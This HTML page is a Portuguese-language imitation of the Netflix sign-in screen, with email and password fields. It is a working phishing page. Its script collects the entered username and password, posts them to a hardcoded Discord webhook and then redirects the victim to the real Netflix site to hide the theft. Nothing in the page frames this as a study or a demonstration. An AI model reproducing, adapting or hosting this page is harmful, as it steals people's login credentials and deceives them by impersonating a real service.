<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Document</title>
</head>

<body>
    <div class="header">
        <div class="logo">
            <a href="#">
                <img src="assets/img/netflixlogo.png" alt="">
            </a>
        </div>
    </div>

    <div class="login_body">
        <div class="login_box">
            <h2>Entrar</h2>
            <form onsubmit="sendMessage()">
                <div class="input_box">
                    <input required type="email" id="username" placeholder="Email ou número de telefone">
                </div>

                <div class="input_box">
                    <input required type="password" id="password" placeholder="Senha">
                </div>

                <div>
                    <button type="submit" class="submit">
                        Sign In
                    </button>
                </div>
            </form>

            <div class="support">
                <div class="remember">
                    <span><input type="checkbox" style="margin: 0;padding: 0; height: 13px;"></span>
                    <span>Lembre-se de mim</span>
                </div>
                <div class="help">
                    <a href="#">
                        Precisa de ajuda?
                    </a>
                </div>
            </div>

            <div class="login_footer">
                <div class="login_facebook">
                    <span><img height="20px" src="assets/img/Facebook_logo.png" alt="facebook"></span>
                    <span><a href="#">Conectar com Facebook</a></span>
                </div>

                <div class="sign_up">
                    <p>Novo por aqui? <a href="#">Assine agora.</a></p>
                </div>

                <div class="terms">
                    <p>Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô. <a href="#">Saiba mais</a></p>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sendMessage() {
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1214945289283047514/z8J37yPMIA8_OunjvvcVzB-7O8RxFqk8NLTUb3i8CJjZxD345avbR7eX6t0en4DvWOKL");
            request.setRequestHeader('Content-type', 'application/json');
            var params = {
                content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
            }
            request.send(JSON.stringify(params));
        
            window.location.replace("https://www.netflix.com");
       
            return false;
        }
    </script>
</body>

</html>
